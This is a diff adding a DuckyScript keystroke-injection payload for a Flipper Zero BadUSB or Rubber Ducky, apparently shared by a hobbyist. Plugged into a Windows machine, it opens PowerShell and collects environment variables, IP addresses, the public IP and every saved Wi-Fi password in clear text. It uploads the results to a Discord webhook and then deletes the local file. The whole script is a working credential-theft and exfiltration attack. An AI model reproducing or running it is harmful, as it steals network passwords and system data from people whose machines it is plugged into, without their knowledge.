@@ -1,0 +1,15 @@
+REM Author: Steven Olsen
+REM Description: Exfiltrate data from workstation and upload to Discord Webhook
+REM Current Discord webhook connects to my Plex Discord server in the private channel #flipper
+REM There's 2 variables to set in the STRING one liner, the webhook URL and then the source device.
+REM This script was initially made for my Flipper BadUSB/KB but also works on my Rubber Ducky
+REM Version: 1.1
+REM Category: Recon
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 1000
+STRING $url="YOUR_DISCORD_WEBHOOK_URL_HERE";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;Invoke-WebRequest ipinfo.io/ip -UseBasicParsing >> stats.txt;$Body=@{ content = "$env:computername Data from ENTER_DEVICE_NAME_HERE"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
+ENTER
